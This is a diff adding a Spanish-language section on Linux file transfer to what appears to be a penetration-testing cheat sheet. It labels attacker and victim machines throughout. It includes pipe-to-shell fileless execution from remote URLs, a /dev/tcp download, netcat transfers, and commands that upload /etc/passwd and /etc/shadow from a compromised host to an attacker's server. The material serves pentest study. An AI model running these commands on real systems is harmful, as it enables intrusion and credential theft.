@@ -1841,6 +1841,190 @@ echo <base64> | base64 -d -w 0 > hosts
 
 Diferentes utilidades para las operaciones de transferencia de archivos en Linux.
 
+#### Operaciones de Descarga
+
+##### Codificación/Decodificación Base64
+
+###### Máquina atacante
+
+```bash
+cat test.txt | base64 -w 0; echo
+SGVsbG8gV29ybGQhCg==
+```
+
+###### Máquina víctima
+
+```bash
+echo "SGVsbG8gV29ybGQhCg==" | base64 -d > test.txt
+```
+
+##### Descargas web con Wget y cURL
+
+Dos de las utilidades más comunes en las distribuciones de Linux para interactuar con aplicaciones web son wget y curl. Estas herramientas están instaladas en muchas distribuciones de Linux.
+
+Para descargar un archivo usando wget, necesitamos especificar la URL y la opción -O para establecer el nombre del archivo de salida.
+
+###### Descargar un archivo usando wget
+
+```bash
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+```
+
+###### Descargar un archivo usando cURL
+
+cURL es muy similar a wget, pero la opción del nombre del archivo de salida es -o en minúscula.
+
+```bash
+curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o /tmp/LinEnum.sh
+```
+
+#### Ataques sin archivos usando Linux
+
+##### Descarga sin archivos con cURL
+
+```bash
+curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+```
+
+```bash
+wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+
+Hello World!
+```
+
+#### Descargar con Bash (/dev/tcp)
+
+También puede haber situaciones en las que ninguna de las herramientas de transferencia de archivos más conocidas esté disponible. Siempre que esté instalada la versión `2.04` o superior de Bash (compilada con `--enable-net-redirections`), el archivo de dispositivo integrado /dev/tcp se puede utilizar para descargas de archivos simples.
+
+##### Máquina atacante
+
+Creamos un servidor HTTP con Python.
+
+```bash
+python3 -m http.server 80
+```
+
+##### Máquina víctima
+
+Nos conectamos al servidor web de destino
+
+```bash
+exec 3<>/dev/tcp/10.10.10.32/80
+```
+
+Realizamos la solicitud HTTP GET
+
+```bash
+echo -e "GET /test.txt HTTP/1.1\n\n">&3
+```
+
+Imprimimos la respuesta
+
+```bash
+cat <&3
+```
+
+#### Descargas SSH
+
+```bash
+scp elliot@192.168.1.19:/root/myroot.txt . 
+```
+
+#### Web Upload
+
+Podemos usar uploadserver , un módulo extendido de Python HTTP.Server módulo, que incluye una página de carga de archivos. Para este ejemplo de Linux, veamos cómo podemos configurar el `uploadserver` módulo a utilizar HTTPS para una comunicación segura.
+
+Lo primero que debemos hacer es instalar el uploadserver módulo.
+
+##### Iniciar servidor web
+
+```bash
+sudo python3 -m pip install --user uploadserver
+```
+
+Ahora necesitamos crear un certificado. En este ejemplo, utilizamos un certificado autofirmado.
+
+Crear un certificado autofirmado
+
+```bash
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+```
+
+El servidor web no debe alojar el certificado. Recomendamos crear un nuevo directorio para alojar el archivo en nuestro servidor web.
+
+##### Iniciar servidor web
+
+```bash
+mkdir https && cd https
+
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+```
+
+Ahora desde nuestra máquina comprometida, carguemos el /etc/passwd y /etc/shadow archivos.
+
+##### Máquina Víctima (Linux)
+
+```bash
+curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+
+Usamos la opción `--insecure` porque utilizamos un certificado autofirmado en el que confiamos.
+
+#### Netcat
+
+##### Máquina atacante
+
+```bash
+nc -l -p 4444 > output.txt
+```
+
+##### Máquina victima
+
+```bash
+nc -w 3 192.168.1.10 4444 < output.txt
+```
+
+#### Método alternativo de transferencia de archivos web
+
+##### Creación de un servidor web con Python3
+
+```bash
+python3 -m http.server
+```
+
+##### Creación de un servidor web con Python2.7
+
+```bash
+python2.7 -m SimpleHTTPServer
+```
+
+##### Creación de un servidor web con PHP
+
+```bash
+php -S 0.0.0.0:8000
+```
+
+##### Creación de un servidor web con Ruby
+
+```bash
+ruby -run -ehttpd . -p8000
+php -S 0.0.0.0:8000
+```
+
+##### Descargamos el archivo
+
+```bash
+wget 192.168.1.19:8000/filetotransfer.txt
+```
+
+#### Operaciones de Subida
+
+##### SCP
+
+```bash
+scp /etc/passwd student@10.10.14.30:/home/student/
+```
+
 ##  9. <a name='movimiento-lateral'></a>Movimiento Lateral
 
 ###  9.1. <a name='rdp'></a>RDP
